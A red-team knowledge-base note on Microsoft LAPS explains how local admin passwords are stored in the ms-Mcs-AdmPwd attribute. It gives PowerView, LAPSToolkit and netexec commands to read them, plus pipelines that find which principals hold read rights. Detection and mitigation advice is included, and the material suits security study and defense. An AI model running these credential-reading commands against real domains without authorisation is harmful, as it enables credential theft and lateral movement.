---
title: LAPS
aliases: ["LAPS", "Local Administrator Password Solution", "ms-Mcs-AdmPwd"]
type: technique
domain: [red-team]
attack_tactic: [credential-access, lateral-movement]
tags: [type/technique, domain/red-team, attack/credential-access]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Pass-the-Hash]]", "[[ACL Abuse]]", "[[Computer Accounts]]", "[[SAM and LSA Secrets Dump]]", "[[PowerView]]", "[[ACL, ACE, DACL, SACL]]"]
created: 2026-06-06
updated: 2026-06-07
---

# LAPS

> [!summary] One-liner
> LAPS randomizes each machine's local admin password and stores it in AD — a defense against shared local-admin reuse, but a target if you can read the attribute.

## What it is (defense)
**LAPS** automatically **randomizes the local Administrator password** on each domain-joined machine and stores the value in AD in the **`ms-Mcs-AdmPwd`** attribute (legacy LAPS; Windows LAPS uses `msLAPS-*`). Authorized principals read it to recover the current password. This kills [[Pass-the-Hash]] sweeps that rely on a **shared** local-admin password.

LAPS extends the AD schema with two attributes (legacy LAPS):
- **`ms-Mcs-AdmPwd`** — stores the **plaintext** local admin password.
- **`ms-Mcs-AdmPwdExpirationTime`** — tracks when the password expires (next rotation).

The LAPS client on each endpoint rotates the plaintext password and writes the result back to AD; **access is restricted by default through ACL permissions** on the attribute. LAPS configuration is normally applied to **OUs via Group Policy**, so the read-permission delegation typically lives on the OU and is inherited by the computer objects within it.

## The attack
- `ms-Mcs-AdmPwd` is **readable by whoever has the ACL** for it. If those read rights are **over-delegated** (or you gain them via [[ACL Abuse]]), you can **read the plaintext local admin password** → instant local admin on that host.

## Commands & tools
```powershell
# Read LAPS password if you have rights
Get-DomainComputer target -Properties ms-Mcs-AdmPwd
Get-LAPSPasswords           # / LAPSToolkit
```
```bash
# Linux
nxc ldap DC -u user -p pass -M laps
certipy / ldapsearch ms-Mcs-AdmPwd
```

## More from harmj0y (finding who can read LAPS with PowerView)
Rather than relying on widespread misconfiguration, the goal is to **enumerate exactly which users/groups have `ReadProperty` rights on the `ms-Mcs-AdmPwd` attribute**, then target those principals for compromise to recover passwords. Because LAPS is applied to OUs via GPO, inspecting **OU ACLs** is the most efficient way to discover delegated read access.

> [!note] These snippets use the older PowerView function names (`Get-NetComputer`, `Get-NetOU`, `Get-ObjectAcl`, `Convert-NameToSid`) from the PowerSploit **dev** branch at the time of the post. In current [[PowerView]] these map to `Get-DomainComputer`, `Get-DomainOU`, `Get-DomainObjectAcl`, and `ConvertFrom-SID` / `Convert-ADName`.

**Who can read LAPS on a single machine** (walk the computer's parent OU ACLs):
```powershell
Get-NetComputer -ComputerName 'LAPSCLIENT.test.local' -FullData |
    Select-Object -ExpandProperty distinguishedname |
    ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {
        Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_
    } | Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        Convert-NameToSid $_.IdentityReference
    } | Select-Object -ExpandProperty SID | Get-ADObject
```

**All OUs in the domain with delegated LAPS read rights** (domain-wide map of who can read what):
```powershell
Get-NetOU -FullData |
    Get-ObjectAcl -ResolveGUIDs |
    Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
        $_
    }
```

Workflow / key functions:
- `Get-NetComputer -FullData` (now `Get-DomainComputer`) — pull the computer object, extract its `distinguishedname`, and substring from the first `OU` to get the parent OU DN.
- `Get-NetOU -FullData` (now `Get-DomainOU`) — enumerate all OUs to inspect domain-wide.
- `Get-ObjectAcl -ResolveGUIDs` (now `Get-DomainObjectAcl`) — read ACEs and resolve the extended-right/attribute GUIDs to friendly names so `ObjectType -like 'ms-Mcs-AdmPwd'` matches.
- Filter on `ActiveDirectoryRights -match 'ReadProperty'` against `ObjectType -like 'ms-Mcs-AdmPwd'` to isolate the principals that can read the password.
- `Convert-NameToSid` (now `ConvertFrom-SID`/`Convert-ADName`) — resolve the `IdentityReference` back to a SID/object so you know which user or group to compromise next.

## Detection / artifacts
Reads of `ms-Mcs-AdmPwd` (if SACL auditing enabled); unusual principals querying LAPS attributes. Bulk OU/ACL enumeration (LDAP queries pulling `ms-Mcs-AdmPwd` ACEs across many OUs) is itself an indicator.

## Mitigation
Tightly scope who can read LAPS attributes, enable read auditing, deploy LAPS everywhere (no un-managed shared local admins). Audit and minimize **OU-level delegation** of `ReadProperty` on `ms-Mcs-AdmPwd` so few principals can recover passwords.

## Related
- Defeats reuse-based [[Pass-the-Hash]]; over-delegated read rights are an [[ACL Abuse]] finding.
- ACE/DACL mechanics behind LAPS read delegation: [[ACL, ACE, DACL, SACL]]; enumeration tooling: [[PowerView]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Microsoft extras → LAPS"
- [[Source - harmj0y blog]] — "Running LAPS with PowerView" — https://blog.harmj0y.net/powershell/running-laps-with-powerview/
